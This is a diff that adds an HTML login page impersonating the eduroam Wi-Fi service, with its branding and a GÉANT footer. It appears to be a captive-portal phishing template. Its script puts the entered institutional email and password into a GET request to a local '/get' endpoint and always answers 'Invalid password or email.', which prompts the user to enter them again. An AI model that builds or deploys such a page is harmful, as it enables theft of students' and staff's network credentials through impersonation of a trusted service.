@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eduroam - Secure WiFi for Education</title>
+    <style>
+        :root {
+            --eduroam-dark-blue: #2a4a60;
+            --eduroam-light-blue: #8ab3d0;
+            --eduroam-background: #f5f7fa;
+            --text-color-light: #ffffff;
+            --text-color-dark: #333333;
+            --input-bg: #3e6078;
+            --error-red-light: #ff9a9a;
+            --success-green: #4CAF50;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body, html {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--eduroam-background);
+            color: var(--text-color-dark);
+            line-height: 1.6;
+        }
+        
+        .page-container {
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .content-wrapper {
+            width: 100%;
+            max-width: 1000px;
+            display: flex;
+            flex-direction: row;
+            gap: 30px;
+            margin: 40px 0;
+        }
+        
+        .info-section {
+            flex: 1;
+            padding: 20px 0;
+        }
+        
+        .info-section h2 {
+            color: var(--eduroam-dark-blue);
+            margin-bottom: 15px;
+            font-size: 28px;
+        }
+        
+        .info-section p {
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .info-card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .info-card h3 {
+            color: var(--eduroam-dark-blue);
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .login-container {
+            background-color: var(--eduroam-dark-blue);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            align-self: flex-start;
+        }
+        
+        .logo {
+            width: 180px;
+            margin-bottom: 25px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: var(--text-color-light);
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--eduroam-light-blue);
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid var(--input-bg);
+            background-color: var(--input-bg);
+            color: var(--text-color-light);
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.2s ease;
+        }
+        
+        input[type="email"]::placeholder, input[type="password"]::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        input[type="email"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: var(--eduroam-light-blue);
+            box-shadow: 0 0 0 3px rgba(138, 179, 208, 0.3);
+        }
+        
+        .form-info {
+            color: var(--eduroam-light-blue);
+            font-size: 13px;
+            margin-top: 6px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--eduroam-light-blue);
+            color: var(--eduroam-dark-blue);
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background-color: #9bc3de;
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .error-message {
+            margin-top: 20px;
+            color: var(--error-red-light);
+            font-weight: 500;
+            min-height: 20px;
+            padding: 10px;
+            border-radius: 6px;
+            background-color: rgba(255, 0, 0, 0.1);
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .remember-me input {
+            margin-right: 10px;
+        }
+        
+        .remember-me label {
+            margin-bottom: 0;
+            display: inline;
+            color: var(--eduroam-light-blue);
+        }
+        
+        .help-links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .help-links a {
+            color: var(--eduroam-light-blue);
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.2s;
+        }
+        
+        .help-links a:hover {
+            color: var(--text-color-light);
+            text-decoration: underline;
+        }
+        
+        footer {
+            background-color: var(--eduroam-dark-blue);
+            color: var(--text-color-light);
+            padding: 25px 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-links a {
+            color: var(--eduroam-light-blue);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        
+        .footer-links a:hover {
+            color: var(--text-color-light);
+            text-decoration: underline;
+        }
+        
+        /* Responsive design */
+        @media (max-width: 900px) {
+            .content-wrapper {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .info-section {
+                order: 2;
+                width: 100%;
+                max-width: 600px;
+            }
+            
+            .login-container {
+                order: 1;
+                max-width: 450px;
+                align-self: center;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .main-content {
+                padding: 0;
+            }
+            
+            .content-wrapper {
+                margin: 0;
+            }
+            
+            .login-container {
+                border-radius: 0;
+                padding: 30px 20px;
+                box-shadow: none;
+                max-width: 100%;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+            
+            .info-section {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <div class="main-content">
+            <div class="content-wrapper">
+                <div class="login-container">
+                    <img class="logo" src="data:image/webp;base64,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" alt="eduroam logo">
+                    <h1>Connect to eduroam</h1>
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <label for="email">Email address</label>
+                            <input type="email" id="email" name="email" placeholder="username@institution.edu" required>
+                            <div class="form-info">Use your institutional email address</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name="password" required>
+                            <div class="form-info">Your institutional network password</div>
+                        </div>
+                        <div class="remember-me">
+                            <input type="checkbox" id="remember" name="remember">
+                            <label for="remember">Remember this device</label>
+                        </div>
+                        <button type="submit">Connect</button>
+                    </form>
+                    <div id="errorMessage" class="error-message">Invalid password or email.</div>
+                    <div class="help-links">
+                        <a href="#">Forgot Password</a>
+                        <a href="#">Help</a>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        <footer>
+            <div class="footer-content">
+                <div class="copyright">
+                    &copy; 2025 eduroam | Powered by GÉANT
+                </div>
+                <div class="footer-links">
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Terms of Use</a>
+                    <a href="#">Contact Support</a>
+                    <a href="#">About eduroam</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+    <script>
+        const loginForm = document.getElementById("loginForm");
+        const errorMessageContainer = document.getElementById("errorMessage");
+        
+        loginForm.addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const remember = document.getElementById("remember").checked;
+            
+            // Validate email format
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(email)) {
+                errorMessageContainer.textContent = "Please enter a valid email address.";
+                errorMessageContainer.classList.add("show");
+                return;
+            }
+            
+            // Password validation
+            if (password.length < 6) {
+                errorMessageContainer.textContent = "Password must be at least 6 characters.";
+                errorMessageContainer.classList.add("show");
+                return;
+            }
+            
+            // Construct parameters for authentication request
+            const params = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&remember=${remember}`;
+            const endpoint = `/get?${params}`;
+            
+            console.log("Request would be sent by GET method to endpoint:", endpoint);
+            
+            // Simulate authentication failure for demo purposes
+            errorMessageContainer.textContent = "Invalid password or email.";
+            errorMessageContainer.classList.add("show");
+            
+            // In a real implementation, you would handle the authentication request here
+            // using fetch or XMLHttpRequest and handle the response accordingly
+        });
+    </script>
+</body>
+</html>
